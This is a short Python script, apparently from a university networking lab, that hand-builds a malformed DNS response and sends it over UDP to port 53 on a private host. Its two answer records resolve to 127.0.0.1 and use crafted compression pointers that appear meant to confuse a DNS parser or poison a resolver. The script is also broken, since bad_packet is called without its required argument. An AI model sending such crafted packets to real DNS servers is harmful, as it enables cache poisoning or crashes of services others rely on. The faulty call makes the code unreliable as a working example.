import random
import socket
import struct
def bad_packet(identification):
    
    transaction_id = identification # 2 byte short
    control        = 0x8180
    q_counts       = 0x0001
    ans_counts     = 0x0002
    auth_counts    = 0x0000
    add_counts     = 0x0000 # 2 byte short
    type_          = 0x0001 # 2 byte short (A)
    class_         = 0x0001 # 2 byte short (IN)

    header = struct.pack("!6H", transaction_id, control, q_counts, ans_counts, auth_counts, add_counts)

    Queries = b'\x03\x6f\x6e\x65\x04\x79\x75\x6d\x69\x03\x69\x70\x6c\x04\x65\x65\x63\x73\x04\x63\x61\x73\x65\x03\x65\x64\x75\x00'+b'\x00\x01\x00\x01'

    Answer1 = b'\x03\x6f\x6e\x65\xc0\x40'+b'\x00\x01\x00\x01'+b'\x00\x00\x01\x00'+b'\x00\x04'+b'\x7f\x00\x00\x01';# Name, type+class, TTL, Data Length, Address

    Answer2 = b'\x03\x6f\x6e\x65\xc0\x2c'+b'\x00\x01\x00\x01'+b'\x00\x00\x01\x00'+b'\x00\x04'+b'\x7f\x00\x00\x01';

    packet = header+Queries+Answer1+Answer2;

    # print(packet);

    return header+Queries+Answer1+Answer2;

if __name__ == "__main__":
    UDP_IP = "172.20.46.1";
    UDP_PORT = 53

    outgoing_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
    outgoing_socket.sendto(bad_packet(),(UDP_IP,UDP_PORT));